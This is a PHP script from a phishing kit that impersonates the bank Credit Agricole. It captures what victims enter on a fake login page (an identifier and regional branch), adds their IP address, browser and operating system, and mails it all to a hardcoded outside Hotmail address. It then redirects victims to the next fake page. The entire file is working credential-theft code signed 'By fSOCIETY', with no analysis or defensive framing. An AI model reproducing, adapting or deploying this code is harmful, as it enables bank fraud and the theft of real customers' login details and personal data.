<?php

session_start();

include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$region_number = $_SESSION['region_number'] = $_POST['region_number'];
$reisse = $_SESSION['reisse'] = $_POST['reisse'];



$yagmail .= '
[+]━━━━━━━━━━━━━━【Credit Agricole】━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━━━【🆔Login】━━━━━━━━━━━━━━━━━━━━[+]
[📪 Saisissez ] = '.$_SESSION['region_number'].'
[📮 region caisse   ] = '.$_SESSION['reisse'].'
[+]=━━━━━━━━━━━━━━━━━━【💻 System】━━━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
[+]━━━━━━━━━━━━━━【Credit Agricole】━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━【By fSOCIETY🖕🤡🖕】━━━━━━━━━━━━━━━[+]
';



$yourmail  = 'el.Dork@hotmail.com';




$subject  = "Region";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);


$src="../Login.php";
header("location:$src");

?>